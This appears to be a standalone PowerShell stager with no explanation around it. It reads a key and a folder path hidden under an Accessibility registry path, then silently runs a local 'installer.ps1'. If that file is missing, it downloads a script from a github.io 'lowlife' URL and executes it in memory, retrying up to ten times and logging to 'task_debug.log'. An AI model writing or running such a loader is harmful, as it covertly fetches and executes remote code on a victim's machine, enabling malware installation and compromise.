try {
    $p = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
    $k = (Get-ItemProperty $p -Name Configuration -ErrorAction SilentlyContinue).Configuration
    $w = (Get-ItemProperty $p -Name Workspace -ErrorAction SilentlyContinue).Workspace
    Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] Reading config: key=$k, workspace=$w"

    if ($k) {
        if ($w -and (Test-Path "$w\installer.ps1")) {
            Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] Running local installer: $w\installer.ps1"
            # Run the installer script and redirect all output/errors to log
            & "$w\installer.ps1" -Silent -Key $k 2>&1 | Add-Content -Path "task_debug.log"
        } else {
            Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] Local installer not found, fetching from web"
            [Net.ServicePointManager]::SecurityProtocol = "Tls12"
            $wc = New-Object Net.WebClient
            for ($i = 0; $i -lt 10; $i++) {
                try {
                    $s = $wc.DownloadString('https://cc312123.github.io/lowlife/files/installer.ps1')
                    if ($s) {
                        Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] Executing web installer script"
                        . ([scriptblock]::Create($s)) -Silent -Key $k 2>&1 | Add-Content -Path "task_debug.log"
                        break
                    }
                } catch {
                    Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] Web download attempt $i failed: $_"
                    Start-Sleep 3
                }
            }
        }
    } else {
        Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] No Configuration key found in registry."
    }
} catch {
    Add-Content -Path "task_debug.log" -Value "[$([DateTime]::Now)] Global Exception: $_"
    Add-Content -Path "task_debug.log" -Value $_.ScriptStackTrace
}
